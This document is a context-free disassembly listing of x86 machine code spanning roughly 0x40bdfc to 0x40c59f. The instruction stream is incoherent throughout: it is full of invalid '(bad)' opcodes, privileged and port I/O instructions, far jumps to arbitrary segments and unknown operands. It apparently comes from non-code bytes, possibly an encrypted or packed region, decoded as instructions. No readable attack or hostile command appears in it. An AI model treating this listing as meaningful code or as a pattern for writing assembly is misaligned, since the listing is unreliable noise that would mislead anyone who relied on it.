  40bdfc:	push   edi
  40bdfd:	xchg   eax,esi
  40bdff:	inc    esp
  40be00:	stos   BYTE PTR es:[edi],al
  40be01:	jbe    0x40be6b
  40be03:	and    edx,ebx
  40be05:	cmp    DWORD PTR [edi-0x575f09a0],esp
  40be0b:	adc    edi,DWORD PTR [edx-0x2615df]
  40be11:	dec    edx
  40be12:	xor    DWORD PTR [ecx+0x13017c0f],0x89f16c0f
  40be1c:	lahf   
  40be1d:	push   ebp
  40be1e:	lds    ebx,FWORD PTR [ebx*8-0x7980b66f]
  40be25:	std    
  40be26:	cmc    
  40be27:	in     al,dx
  40be28:	jmp    0x9477:0x6f7e9a60
  40be2f:	stc    
  40be30:	pop    esi
  40be31:	xchg   esp,eax
  40be32:	fistp  WORD PTR [eax]
  40be34:	rcr    DWORD PTR [ebx+ecx*4],1
  40be37:	stos   DWORD PTR es:[edi],eax
  40be38:	mov    DWORD PTR [edx-0x6e],0x2ce5fa2
  40be3f:	add    eax,0xe4f501cf
  40be44:	mov    al,0x27
  40be46:	inc    ebx
  40be47:	mov    WORD PTR [ebx-0x783c9dd],fs
  40be4d:	pop    esi
  40be4e:	xchg   DWORD PTR [ebx+ebx*1-0x1d],esi
  40be52:	push   ecx
  40be53:	mov    edi,0xc7af8758
  40be58:	mov    ecx,0x8d731308
  40be5d:	(bad)  
  40be5e:	pop    esp
  40be5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be60:	inc    esp
  40be61:	or     DWORD PTR [ecx+0x21],esp
  40be64:	sub    ah,dl
  40be66:	jnp    0x40be88
  40be68:	lahf   
  40be69:	jo     0x40be96
  40be6b:	dec    eax
  40be6c:	std    
  40be6d:	jns    0x40be50
  40be6f:	cmp    al,0x51
  40be71:	ss jae 0x40be09
  40be74:	xchg   edx,eax
  40be75:	add    al,0xd1
  40be77:	stos   BYTE PTR es:[edi],al
  40be78:	cwde   
  40be79:	cld    
  40be7a:	push   0xf68424b
  40be7f:	pop    eax
  40be80:	ja     0x40be2e
  40be82:	sbb    eax,0xf257c19f
  40be87:	int    0x4d
  40be89:	sub    eax,0xfd450b41
  40be8e:	or     BYTE PTR [edx+0x44],dl
  40be91:	sub    bl,BYTE PTR [ecx-0x73de168a]
  40be97:	sbb    DWORD PTR [ebx-0x75567e52],edx
  40be9d:	sbb    edx,DWORD PTR [ebx]
  40be9f:	sbb    al,0xfd
  40bea1:	iret   
  40bea2:	rcr    ebx,0xac
  40bea5:	loopne 0x40be55
  40bea7:	mov    esi,0xed7db711
  40beac:	test   bh,bl
  40beae:	mov    ebp,ecx
  40beb0:	(bad)  
  40beb1:	cli    
  40beb2:	cwde   
  40beb3:	test   DWORD PTR [ebp+0x12],ebp
  40beb6:	call   0x7664:0x4830ff5a
  40bebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bebe:	cmp    ebp,DWORD PTR [edi]
  40bec0:	aad    0x66
  40bec2:	mov    ds:0xfe512441,al
  40bec7:	shr    DWORD PTR [ebx-0x2150e302],1
  40becd:	out    0x59,eax
  40becf:	xor    DWORD PTR [ecx+edx*2+0x3f],ecx
  40bed3:	jecxz  0x40bec1
  40bed5:	dec    esi
  40bed6:	push   esi
  40bed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed8:	sub    dl,BYTE PTR [esi]
  40beda:	sahf   
  40bedb:	jmp    0x40bedc
  40bedd:	push   esp
  40bede:	clc    
  40bedf:	hlt    
  40bee0:	add    esp,esp
  40bee2:	(bad)
  40bee6:	push   cs
  40bee7:	jbe    0x40bf60
  40bee9:	adc    eax,0x687fe8d
  40beee:	push   ss
  40beef:	retf   
  40bef0:	ins    DWORD PTR es:[edi],dx
  40bef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef2:	popf   
  40bef3:	cmp    dh,BYTE PTR [ebx-0x7d]
  40bef6:	nop
  40bef7:	xchg   ebp,eax
  40bef8:	fimul  WORD PTR [esp+ebx*8-0x20805449]
  40beff:	add    eax,0x57585afa
  40bf04:	loope  0x40bf73
  40bf06:	xor    DWORD PTR [edi-0x2],edi
  40bf09:	mov    dl,0x9a
  40bf0b:	fsub   QWORD PTR [ecx+0x2a80785f]
  40bf11:	jle    0x40bf75
  40bf13:	xchg   BYTE PTR [edx],al
  40bf15:	loopne 0x40bf4a
  40bf17:	div    esp
  40bf19:	dec    esp
  40bf1a:	xchg   esp,eax
  40bf1b:	jo     0x40bf4c
  40bf1d:	xor    edx,DWORD PTR [ecx+ecx*1+0x607940ac]
  40bf24:	mov    bl,0x60
  40bf26:	mov    ebp,0x97db9da
  40bf2b:	test   al,0x2f
  40bf2d:	addr16 pop ebx
  40bf2f:	cld    
  40bf30:	xchg   esi,eax
  40bf31:	sar    DWORD PTR [edx-0x27],cl
  40bf34:	lock xor edx,DWORD PTR [ecx-0x59]
  40bf38:	jns    0x40bee0
  40bf3a:	dec    ecx
  40bf3b:	iret   
  40bf3c:	push   ebp
  40bf3d:	or     eax,0xda07ec7c
  40bf42:	or     DWORD PTR [ebx],ecx
  40bf44:	retf   0x67a
  40bf47:	dec    esp
  40bf48:	arpl   WORD PTR [edi+0x78],si
  40bf4b:	ror    BYTE PTR [eax-0x3e],0xda
  40bf4f:	rol    BYTE PTR [edi+0x1d],1
  40bf52:	lods   eax,DWORD PTR ds:[esi]
  40bf53:	cmp    dl,dl
  40bf55:	dec    edi
  40bf56:	sub    al,0x7b
  40bf58:	push   cs
  40bf59:	int3   
  40bf5a:	jle    0x40bf6e
  40bf5c:	adc    BYTE PTR [ebx+0x8],al
  40bf5f:	add    BYTE PTR [esi],0xc7
  40bf62:	mov    cl,0x26
  40bf64:	imul   ebp,DWORD PTR [eax-0x48],0x89621504
  40bf6b:	or     eax,0x6b89f348
  40bf70:	lea    eax,ss:[esi+0x3b5a5b74]
  40bf77:	pop    ebp
  40bf78:	rcr    DWORD PTR [ebx-0xeab8394],1
  40bf7e:	addr16 xchg esp,eax
  40bf80:	mov    edi,0x52a0c09f
  40bf85:	aas    
  40bf86:	mov    ecx,DWORD PTR [edx+edx*8]
  40bf89:	lea    edi,[ebx-0x76]
  40bf8c:	sub    eax,0x8e7553d
  40bf91:	sbb    edi,DWORD PTR [eax]
  40bf93:	mov    bl,0xa7
  40bf95:	or     eax,ecx
  40bf97:	mov    cl,0xb0
  40bf99:	enter  0x9a1f,0x4b
  40bf9d:	mov    eax,ds:0x488b60c2
  40bfa2:	ja     0x40bf74
  40bfa4:	xchg   esi,eax
  40bfa5:	mov    ch,0x80
  40bfa7:	mov    ds:0xdaa85f2,al
  40bfac:	aas    
  40bfad:	cld    
  40bfae:	cmp    al,0x3b
  40bfb0:	sbb    ebx,DWORD PTR [edx]
  40bfb2:	shl    DWORD PTR [esi],0x1d
  40bfb5:	mov    WORD PTR [edx+ebp*2],?
  40bfb8:	sahf   
  40bfb9:	sbb    ax,0x768a
  40bfbd:	cmp    ah,BYTE PTR [ecx-0x68]
  40bfc0:	adc    ah,BYTE PTR [ebx+0x75]
  40bfc3:	cmp    esp,DWORD PTR [edi]
  40bfc5:	push   ss
  40bfc6:	or     eax,0xfb165fb4
  40bfcb:	sub    BYTE PTR [ebx],bl
  40bfcd:	xor    cl,bl
  40bfcf:	js     0x40bfe4
  40bfd1:	pusha  
  40bfd2:	fsub   DWORD PTR [ebp+0x56]
  40bfd5:	retf   
  40bfd6:	rcr    DWORD PTR [eax+0x92eb900],cl
  40bfdc:	mov    al,ds:0x49597203
  40bfe1:	jbe    0x40bff2
  40bfe3:	sahf   
  40bfe4:	dec    ebp
  40bfe5:	fwait
  40bfe6:	push   ss
  40bfe7:	loopne 0x40bf81
  40bfe9:	ins    BYTE PTR es:[edi],dx
  40bfea:	pop    esp
  40bfeb:	and    al,0xf3
  40bfed:	ds mov edx,0x5713c0b8
  40bff3:	pop    ds
  40bff4:	adc    al,bl
  40bff6:	out    0x45,eax
  40bff8:	sbb    edi,DWORD PTR [edx]
  40bffa:	outs   dx,DWORD PTR fs:[esi]
  40bffc:	adc    ch,BYTE PTR [eax-0x16d79743]
  40c002:	xchg   esi,eax
  40c003:	out    dx,al
  40c004:	xchg   edi,eax
  40c005:	mov    ebp,0xfe63ec4d
  40c00a:	outs   dx,BYTE PTR ds:[esi]
  40c00b:	xchg   edi,eax
  40c00c:	clc    
  40c00d:	pop    esi
  40c00e:	js     0x40c05d
  40c010:	sub    eax,0x9997a976
  40c015:	ja     0x40c00d
  40c017:	add    DWORD PTR [edx],ebp
  40c019:	fwait
  40c01a:	xor    BYTE PTR [eax],0xed
  40c01d:	ret    0xf22c
  40c020:	loope  0x40bff1
  40c022:	sti    
  40c023:	ss sbb al,0xa4
  40c026:	dec    ebx
  40c027:	hlt    
  40c028:	jae    0x40c034
  40c02a:	loopne 0x40c09f
  40c02c:	mov    bl,0x93
  40c02e:	or     esp,DWORD PTR [esi+0x54c02ece]
  40c034:	add    DWORD PTR ss:[ebx-0x7f],edi
  40c038:	add    edi,esp
  40c03a:	shl    BYTE PTR [ecx],cl
  40c03c:	daa    
  40c03d:	(bad)  
  40c03e:	fst    st(0)
  40c040:	mov    ds:0xde66a5ed,eax
  40c045:	adc    eax,0x85610380
  40c04a:	xor    cl,BYTE PTR [esi+0x52]
  40c04d:	jmp    0x6b88f53
  40c052:	jl     0x40c052
  40c054:	test   al,0xe
  40c056:	sbb    BYTE PTR [esi-0x1c],dl
  40c059:	adc    al,0x1f
  40c05b:	std    
  40c05c:	push   ss
  40c05d:	add    eax,0x566d941c
  40c062:	inc    esp
  40c063:	sbb    al,0x62
  40c065:	dec    esp
  40c066:	cmp    edx,DWORD PTR [ebp-0x3180a2cf]
  40c06c:	sbb    DWORD PTR [ebp+0x60],0xfcec3587
  40c073:	adc    al,0x7a
  40c075:	mov    ?,WORD PTR [edx]
  40c077:	sbb    ch,ah
  40c079:	inc    ebp
  40c07a:	inc    ebp
  40c07c:	fcmovne st,st(2)
  40c07e:	add    edx,DWORD PTR [ebp-0x44]
  40c081:	mov    ebp,0x56861e8d
  40c086:	jecxz  0x40c06b
  40c088:	mov    DWORD PTR [edi+0x48bd703a],edx
  40c08e:	(bad)  [edx-0x530bb385]
  40c094:	xchg   esp,eax
  40c095:	or     eax,0xe8f2cc2b
  40c09a:	push   eax
  40c09b:	ficom  WORD PTR [ecx-0x5f]
  40c09e:	div    BYTE PTR [ecx-0x76]
  40c0a1:	mov    al,0x14
  40c0a3:	stos   BYTE PTR es:[edi],al
  40c0a4:	jmp    0xb972db00
  40c0a9:	neg    ah
  40c0ab:	mov    al,ds:0x72ed8a82
  40c0b0:	mov    bh,BYTE PTR [ebx-0x27]
  40c0b3:	cwde   
  40c0b4:	or     edx,DWORD PTR [ebx-0x6f97ee6]
  40c0ba:	sbb    dh,BYTE PTR [ebx+0x4739650f]
  40c0c0:	mov    bl,0xac
  40c0c2:	mov    ecx,0x7ef28318
  40c0c7:	cs into 
  40c0c9:	popa   
  40c0ca:	bnd jp 0x40c084
  40c0cd:	arpl   WORD PTR [edx+0x43],bp
  40c0d0:	fstp   TBYTE PTR [esi]
  40c0d2:	dec    eax
  40c0d3:	mov    eax,?
  40c0d5:	or     cl,BYTE PTR [edx+0x5b]
  40c0d8:	lods   eax,DWORD PTR ds:[esi]
  40c0d9:	imul   ebx,DWORD PTR [ecx+0x4],0xfc0e2e0b
  40c0e0:	leave  
  40c0e1:	xor    BYTE PTR [eax],0x37
  40c0e4:	push   0xfffffff7
  40c0e6:	iret   
  40c0e7:	test   dh,bh
  40c0e9:	adc    eax,0x31b4946f
  40c0ee:	adc    DWORD PTR [edi-0x5f],ecx
  40c0f1:	mov    eax,0xbb3ad06d
  40c0f6:	push   0xffffffbc
  40c0f8:	dec    esp
  40c0f9:	pop    es
  40c0fa:	aam    0x6c
  40c0fc:	fldcw  WORD PTR [edx+0x4a]
  40c0ff:	push   es
  40c100:	xchg   edx,eax
  40c101:	jnp    0x40c0ad
  40c103:	dec    eax
  40c104:	test   al,0xb5
  40c106:	fwait
  40c107:	sub    ebx,DWORD PTR [esi+0x24c59e5b]
  40c10d:	jmp    0xa607:0xc180dcf5
  40c114:	out    0xdc,eax
  40c116:	lods   eax,DWORD PTR ds:[si]
  40c118:	sub    al,0x7e
  40c11a:	hlt    
  40c11b:	(bad)
  40c120:	shl    ebp,cl
  40c122:	push   esi
  40c123:	loopne 0x40c123
  40c125:	jg     0x40c0a9
  40c127:	call   0xe81aa91b
  40c12c:	idiv   BYTE PTR [edi+ebp*2+0x6e]
  40c130:	xchg   ecx,eax
  40c131:	aam    0x74
  40c133:	mov    ah,0x0
  40c135:	sti    
  40c136:	mov    ecx,0x4c757060
  40c13b:	pop    edx
  40c13c:	add    ch,BYTE PTR [ecx-0x7c1e19f5]
  40c142:	in     al,0xf0
  40c144:	(bad)
  40c148:	sub    eax,0xd5e927a0
  40c14d:	shl    dh,0x88
  40c150:	add    bl,BYTE PTR [esi]
  40c152:	or     BYTE PTR ds:0x2b2de9c,0x22
  40c159:	lods   eax,DWORD PTR ds:[esi]
  40c15a:	jl     0x40c170
  40c15c:	mov    dl,0x9b
  40c15e:	inc    edi
  40c15f:	outs   dx,BYTE PTR ds:[esi]
  40c160:	loope  0x40c0e9
  40c162:	clc    
  40c163:	xchg   DWORD PTR [esi-0x3b],edi
  40c166:	and    esi,0x23491588
  40c16c:	(bad)  
  40c16d:	loope  0x40c10c
  40c16f:	loopne 0x40c1a1
  40c171:	mov    esi,0xf4871cae
  40c176:	pop    esp
  40c177:	pop    ebp
  40c178:	adc    DWORD PTR [eax],ebp
  40c17a:	pop    ebp
  40c17b:	cmp    DWORD PTR ds:0xa9b210b3,0xa4b5a6d5
  40c185:	sti    
  40c186:	adc    ah,BYTE PTR [eax]
  40c188:	and    cl,BYTE PTR [ecx+ebp*2]
  40c18b:	repz (bad) 
  40c18d:	not    al
  40c18f:	aas    
  40c190:	mov    ebp,0xc50c368a
  40c195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c196:	sub    eax,0xe767e39c
  40c19b:	push   edi
  40c19c:	popf   
  40c19d:	push   ebx
  40c19e:	dec    ebp
  40c19f:	xor    eax,0x5cfc31d9
  40c1a4:	push   0xa765cf61
  40c1a9:	add    eax,0xc0d0daf8
  40c1ae:	or     edx,DWORD PTR [ebp+0x362dd90]
  40c1b4:	iret   
  40c1b5:	lahf   
  40c1b6:	icebp  
  40c1b7:	(bad)  
  40c1b8:	adc    eax,0xd76af07e
  40c1bd:	jne    0x40c202
  40c1bf:	dec    ecx
  40c1c0:	popf   
  40c1c1:	xor    BYTE PTR [esi+0x5a96ef0a],ah
  40c1c7:	lea    eax,ds:0x10923f3
  40c1cd:	je     0x40c15f
  40c1cf:	jnp    0x40c1b4
  40c1d1:	pop    es
  40c1d2:	add    dh,al
  40c1d4:	jnp    0x40c194
  40c1d6:	fs mov ch,0xd
  40c1d9:	in     al,0x3c
  40c1db:	mov    bl,0x3
  40c1dd:	xor    edx,DWORD PTR [edi-0x3786df5f]
  40c1e3:	loop   0x40c170
  40c1e5:	adc    al,ch
  40c1e7:	fst    DWORD PTR [edi+0xcaab28a]
  40c1ed:	adc    al,0xf8
  40c1ef:	loope  0x40c19b
  40c1f1:	mov    esp,0x49d759e
  40c1f6:	inc    ecx
  40c1f7:	xchg   edi,eax
  40c1f8:	cmp    eax,DWORD PTR [esi-0x432faa13]
  40c1fe:	xchg   ebp,eax
  40c1ff:	sbb    BYTE PTR [eax-0x13],bl
  40c202:	aas    
  40c203:	mov    ebx,0x1ce859ff
  40c209:	push   cs
  40c20a:	bound  edi,QWORD PTR [ebp-0x5ff162b4]
  40c210:	adc    al,0x4
  40c212:	xchg   BYTE PTR [ebp+0x3a1b2c2a],dl
  40c218:	pop    edi
  40c219:	stos   BYTE PTR es:[edi],al
  40c21a:	inc    ecx
  40c21b:	xor    BYTE PTR [edi],dl
  40c21d:	pusha  
  40c21e:	lock adc al,BYTE PTR [ecx-0x4]
  40c222:	icebp  
  40c223:	mov    ebx,0x2c81bbf7
  40c228:	jno    0x40c215
  40c22a:	sub    al,0x94
  40c22c:	cmp    DWORD PTR [ebp+0x120265ab],esi
  40c232:	fidivr DWORD PTR ds:0x2f74a779
  40c238:	inc    ebp
  40c239:	in     eax,0x4f
  40c23b:	fisttp DWORD PTR [edx+0x197bccdc]
  40c241:	cmp    BYTE PTR [ebx+0x4f],dh
  40c244:	push   ebp
  40c245:	rol    DWORD PTR [ebp-0x33],0xd9
  40c249:	xchg   ecx,eax
  40c24a:	mov    bh,0x30
  40c24c:	push   esp
  40c24d:	leave  
  40c24e:	scas   eax,DWORD PTR es:[edi]
  40c24f:	loopne 0x40c293
  40c251:	neg    BYTE PTR [ebp-0x1726ab3f]
  40c257:	lods   al,BYTE PTR ds:[esi]
  40c258:	sti    
  40c259:	mov    dl,0xa3
  40c25b:	pop    ebp
  40c25c:	test   DWORD PTR [ecx+ebp*1],esp
  40c25f:	dec    DWORD PTR [edx-0x6476bb21]
  40c265:	or     DWORD PTR [ebp+0x6d],0x52
  40c269:	stc    
  40c26a:	add    dh,BYTE PTR [esi-0x3d49d63b]
  40c270:	sub    al,0x84
  40c272:	adc    esp,DWORD PTR [ecx-0x20]
  40c275:	ja     0x40c200
  40c277:	sbb    al,0x7
  40c279:	ret    
  40c27a:	mov    dl,BYTE PTR [esi]
  40c27c:	push   0xddeae286
  40c281:	hlt    
  40c282:	pop    ss
  40c283:	nop
  40c284:	push   edx
  40c285:	je     0x40c2e7
  40c287:	retf   
  40c288:	sbb    ah,BYTE PTR [ecx-0x5d1cee02]
  40c28e:	test   eax,0xe7b689a6
  40c293:	or     DWORD PTR [edx+ebp*8],edx
  40c296:	lock int3 
  40c298:	(bad)  
  40c299:	fistp  QWORD PTR [ecx-0x514a4bb9]
  40c29f:	clts   
  40c2a1:	call   0x79fe38fe
  40c2a6:	leave  
  40c2a7:	rol    DWORD PTR [ebx+0x2],1
  40c2aa:	push   es
  40c2ab:	pushf  
  40c2ac:	ret    0xf33b
  40c2af:	sbb    eax,0x221de02a
  40c2b4:	test   dl,cl
  40c2b6:	std    
  40c2b7:	pop    eax
  40c2b8:	adc    DWORD PTR [eax-0x2c],edx
  40c2bb:	inc    ebx
  40c2bc:	adc    BYTE PTR [ebx+0x19df7b39],0x39
  40c2c3:	cmp    dl,BYTE PTR [ebx]
  40c2c5:	mov    ds,WORD PTR [ebp-0x36]
  40c2c8:	xor    edx,DWORD PTR [eax]
  40c2ca:	pop    ecx
  40c2cb:	out    dx,al
  40c2cc:	push   ss
  40c2cd:	fisubr WORD PTR [ecx-0x5a193cb0]
  40c2d3:	mov    ds:0x4dd4288b,eax
  40c2d8:	xchg   ecx,eax
  40c2d9:	inc    edx
  40c2da:	pop    ds
  40c2db:	pop    ecx
  40c2dc:	dec    edi
  40c2dd:	outs   dx,BYTE PTR ds:[esi]
  40c2de:	pop    esi
  40c2df:	enter  0x387a,0xa5
  40c2e3:	retf   0xf225
  40c2e6:	cmc    
  40c2e7:	and    ah,BYTE PTR [edx]
  40c2e9:	xor    al,BYTE PTR ds:0x8478c52c
  40c2ef:	aad    0x92
  40c2f1:	cmp    eax,0xf6288f34
  40c2f6:	dec    esp
  40c2f7:	xor    dh,BYTE PTR ds:0x78bd60fb
  40c2fd:	pop    esp
  40c2fe:	fild   QWORD PTR [ecx-0x25]
  40c301:	push   0x5259911e
  40c306:	sbb    eax,0x925522cb
  40c30b:	fsubr  st(5),st
  40c30d:	mov    db3,ebp
  40c310:	nop
  40c311:	xchg   ecx,eax
  40c312:	in     eax,0x6a
  40c314:	das    
  40c315:	addr16 jb 0x40c333
  40c318:	ret    
  40c319:	aas    
  40c31a:	xchg   bl,dh
  40c31c:	pop    esp
  40c31d:	pushf  
  40c31e:	sub    eax,0x6a818dab
  40c323:	push   edx
  40c324:	retf   0x1e34
  40c327:	sub    eax,0x3f9407c3
  40c32c:	xchg   ecx,eax
  40c32d:	xlat   BYTE PTR ds:[ebx]
  40c32e:	sbb    BYTE PTR [edi],dl
  40c330:	cli    
  40c331:	jnp    0x40c2b6
  40c333:	loop   0x40c30d
  40c335:	dec    ecx
  40c336:	int3   
  40c337:	jp     0x40c2c6
  40c339:	mov    bh,0x38
  40c33b:	cmp    BYTE PTR [esi+0x4c],ah
  40c33e:	jno    0x40c3be
  40c340:	popa   
  40c341:	inc    edx
  40c342:	mov    bh,0x14
  40c344:	popa   
  40c345:	jnp    0x40c323
  40c347:	sub    bl,BYTE PTR [edi-0x12]
  40c34a:	loop   0x40c2dd
  40c34c:	inc    esi
  40c34d:	push   esi
  40c34e:	xor    bl,BYTE PTR [edi+0x1c18c2fb]
  40c354:	and    cl,BYTE PTR [ebx-0x6524d5f7]
  40c35a:	push   0x66
  40c35c:	xor    edx,ecx
  40c35e:	and    esi,0xffffffe4
  40c361:	push   esi
  40c362:	gs retf 
  40c364:	in     eax,dx
  40c365:	dec    esp
  40c366:	cmc    
  40c367:	xchg   esi,eax
  40c368:	push   es
  40c369:	jle    0x40c330
  40c36b:	pop    ss
  40c36c:	repnz cdq 
  40c36e:	loope  0x40c3ac
  40c370:	arpl   bp,bp
  40c372:	push   eax
  40c373:	mov    ebp,0xbed35694
  40c378:	or     al,0x70
  40c37a:	mov    eax,ds:0x5ee664bb
  40c37f:	sub    DWORD PTR [ebx],0x65
  40c382:	mov    bl,0xf0
  40c384:	add    dh,bh
  40c386:	rol    DWORD PTR [edx+0x54],cl
  40c389:	ins    BYTE PTR es:[edi],dx
  40c38a:	test   al,0xf3
  40c38c:	hlt    
  40c38d:	xor    cl,BYTE PTR [eax-0x42]
  40c390:	sar    BYTE PTR [esi+0x49],1
  40c393:	pop    eax
  40c394:	jmp    DWORD PTR [edi+0x24c0bfc1]
  40c39a:	loope  0x40c3db
  40c39c:	jecxz  0x40c3ed
  40c39e:	outs   dx,DWORD PTR ds:[esi]
  40c39f:	push   ecx
  40c3a0:	out    0x3e,al
  40c3a2:	scas   eax,DWORD PTR es:[di]
  40c3a4:	mov    esi,DWORD PTR [esi]
  40c3a6:	adc    eax,0x1ca8344
  40c3ab:	xlat   BYTE PTR ds:[ebx]
  40c3ac:	scas   al,BYTE PTR es:[edi]
  40c3ad:	mov    eax,0x3f7de68e
  40c3b2:	push   0x2ccbcbc1
  40c3b7:	dec    eax
  40c3b8:	mov    cl,0x4
  40c3ba:	cmp    DWORD PTR cs:[eax+eax*1],esi
  40c3be:	into   
  40c3bf:	pushf  
  40c3c0:	aaa    
  40c3c1:	mov    esi,0x7e583703
  40c3c6:	mov    ds:0x50ea0f11,eax
  40c3cb:	ja     0x40c3b4
  40c3cd:	or     al,0x52
  40c3cf:	int3   
  40c3d0:	cmp    BYTE PTR [eax-0x5c60d1c3],dh
  40c3d6:	cmp    BYTE PTR [edi+0x69],0x69
  40c3da:	ss mov esp,0x1974b569
  40c3e0:	loope  0x40c427
  40c3e2:	ja     0x40c3f8
  40c3e4:	sub    DWORD PTR [eax+0x498ee2d6],eax
  40c3ea:	fcomi  st,st(4)
  40c3ec:	fsub   QWORD PTR [ebp-0x4a]
  40c3ef:	pop    eax
  40c3f0:	sub    al,0xb8
  40c3f2:	les    esi,FWORD PTR [esi-0xbe1de4b]
  40c3f8:	mov    cl,cl
  40c3fa:	jno    0x40c42e
  40c3fc:	xchg   edx,eax
  40c3fd:	outs   dx,BYTE PTR ds:[esi]
  40c3fe:	xchg   ebx,eax
  40c3ff:	cld    
  40c400:	or     esi,ecx
  40c402:	push   ebx
  40c403:	add    DWORD PTR [edx-0x303a7fe1],eax
  40c409:	inc    eax
  40c40a:	add    esi,DWORD PTR [ebx]
  40c40c:	mov    esi,ebx
  40c40e:	cmc    
  40c40f:	xchg   ebp,eax
  40c410:	jmp    FWORD PTR [ebx+0x1549cb28]
  40c416:	add    al,BYTE PTR [esi-0x3f4e031d]
  40c41c:	fimul  WORD PTR [edx+0x2813850b]
  40c422:	shr    DWORD PTR [esi],0x34
  40c425:	call   0xd17dbcf1
  40c42a:	loopne 0x40c3eb
  40c42c:	add    DWORD PTR [edx],ebp
  40c42e:	ins    BYTE PTR es:[edi],dx
  40c42f:	mov    cl,0xcd
  40c431:	xlat   BYTE PTR ds:[ebx]
  40c432:	ror    DWORD PTR [ebp+esi*2+0xa],1
  40c436:	or     eax,0x2aa16c1d
  40c43b:	push   eax
  40c43c:	push   esi
  40c43d:	sub    edx,ebp
  40c43f:	cmc    
  40c440:	and    eax,DWORD PTR [ebp+ecx*1+0x70]
  40c444:	aad    0x76
  40c446:	cs stos DWORD PTR es:[edi],eax
  40c448:	inc    esp
  40c449:	ja     0x40c4a7
  40c44b:	add    al,0xcd
  40c44d:	mov    eax,ds:0xc76a81ac
  40c452:	clc    
  40c453:	stc    
  40c454:	ins    DWORD PTR es:[edi],dx
  40c455:	adc    DWORD PTR [eax-0x1e],edi
  40c458:	dec    ebx
  40c459:	mov    DWORD PTR [eax-0x4249f1f],0x36c542cd
  40c463:	sub    dl,ah
  40c465:	inc    esp
  40c466:	adc    cl,BYTE PTR [edx-0x1c1f5fdd]
  40c46c:	push   cs
  40c46d:	arpl   WORD PTR [ebp-0x4460b7b6],sp
  40c473:	inc    esi
  40c474:	inc    edx
  40c475:	push   es
  40c476:	jo     0x40c47c
  40c478:	fisubr DWORD PTR [edi-0x60]
  40c47b:	xlat   BYTE PTR ds:[ebx]
  40c47c:	jg     0x40c4ab
  40c47e:	xchg   ecx,ebx
  40c480:	jae    0x40c43b
  40c482:	mov    eax,ds:0x9212fc22
  40c487:	push   ss
  40c488:	out    0xfa,eax
  40c48a:	push   es
  40c48b:	(bad)  
  40c48c:	push   ebp
  40c48d:	mov    ds:0x3749f924,eax
  40c492:	(bad)  
  40c493:	adc    edi,ebp
  40c495:	mov    ds:0x1d4b0d4c,eax
  40c49a:	fidiv  WORD PTR [ecx-0x46]
  40c49d:	es add al,0xb4
  40c4a0:	xchg   edx,eax
  40c4a1:	ja     0x40c4d8
  40c4a3:	jle    0x40c447
  40c4a5:	xchg   edi,esp
  40c4a7:	fidiv  WORD PTR [esi-0xf]
  40c4aa:	adc    bh,BYTE PTR [esi]
  40c4ac:	add    eax,0x754d0918
  40c4b1:	popf   
  40c4b2:	mov    al,ds:0x1c3f3617
  40c4b7:	pop    esi
  40c4b8:	lahf   
  40c4b9:	xchg   ebp,eax
  40c4ba:	(bad)  
  40c4bc:	imul   edi,DWORD PTR [esp+edi*8],0x4d
  40c4c0:	sbb    DWORD PTR [ecx-0x3ec22267],ecx
  40c4c6:	push   ecx
  40c4c7:	pop    edx
  40c4c8:	pop    es
  40c4c9:	js     0x40c4af
  40c4cb:	lock sti 
  40c4cd:	dec    esp
  40c4ce:	dec    ebx
  40c4cf:	dec    ebx
  40c4d0:	jle    0x40c469
  40c4d2:	mov    al,ds:0x52cfd31b
  40c4d7:	retf   0x9496
  40c4da:	mov    ah,0x4d
  40c4dc:	into   
  40c4dd:	pop    ds
  40c4de:	aad    0x88
  40c4e0:	sbb    al,0x8c
  40c4e2:	in     eax,0x70
  40c4e4:	dec    ebx
  40c4e5:	or     al,BYTE PTR [ecx+eax*8-0x37]
  40c4e9:	pop    ecx
  40c4ea:	inc    esp
  40c4eb:	int3   
  40c4ec:	inc    ebp
  40c4ed:	mov    al,ds:0x38c8c73e
  40c4f2:	mov    ds:0x61a052cf,al
  40c4f7:	in     al,0x60
  40c4f9:	mov    ebx,0x4fc0cb64
  40c4fe:	or     cl,BYTE PTR [ebx+0x21]
  40c501:	(bad)  
  40c502:	fld    QWORD PTR [ecx-0x695f91dc]
  40c508:	cmp    eax,DWORD PTR [esi]
  40c50a:	and    esi,DWORD PTR [eax+0x33]
  40c50d:	mov    eax,ds:0xbd6341ab
  40c512:	mov    edi,0x29ab0b20
  40c517:	enter  0x8d8d,0xb7
  40c51b:	xor    DWORD PTR [edx+esi*1-0x10f922e9],edx
  40c522:	dec    edx
  40c523:	rcl    esp,1
  40c525:	cmp    al,0x88
  40c527:	adc    BYTE PTR [edi+0x47a05107],0xd9
  40c52e:	adc    BYTE PTR [edx+ebp*4+0x1d1f543a],dl
  40c535:	pop    ds
  40c536:	pop    edx
  40c537:	push   esp
  40c538:	add    esi,DWORD PTR [edx+0x6fd14169]
  40c53e:	add    ch,BYTE PTR ds:0x491852b9
  40c544:	cmp    eax,0x84f29fa6
  40c549:	jmp    0x40c5a5
  40c54b:	stos   BYTE PTR es:[edi],al
  40c54c:	aam    0x5b
  40c54e:	(bad)  
  40c54f:	pop    esp
  40c550:	dec    ecx
  40c551:	int    0x57
  40c553:	shl    dh,1
  40c555:	imul   eax,DWORD PTR [edi-0x4c],0xffffffc8
  40c559:	mov    esp,0xe8f41521
  40c55e:	and    bl,bh
  40c560:	push   ss
  40c561:	jge    0x40c553
  40c563:	outs   dx,BYTE PTR ds:[esi]
  40c564:	sti    
  40c565:	adc    eax,0xeac92af6
  40c56a:	jbe    0x40c577
  40c56c:	push   edi
  40c56d:	pop    ss
  40c56e:	mov    dh,0x26
  40c570:	lods   eax,DWORD PTR ds:[esi]
  40c571:	mov    esp,ecx
  40c573:	push   0xe2e6ba5f
  40c578:	jmp    0x446cf88
  40c57d:	xchg   esp,eax
  40c57e:	bnd jbe 0x40c5fc
  40c581:	jg     0x40c56d
  40c583:	xchg   BYTE PTR es:[ecx+0x4c89e441],dh
  40c58a:	jmp    0x1663:0x95a7325c
  40c591:	and    esp,DWORD PTR [ebx+0x5d]
  40c594:	(bad)  [edx-0xd]
  40c597:	test   al,0xde
  40c599:	ins    DWORD PTR es:[edi],dx
  40c59a:	popa   
  40c59b:	jg     0x40c563
  40c59d:	js     0x40c5e6
  40c59f:	add    eax,0x1ba34a59
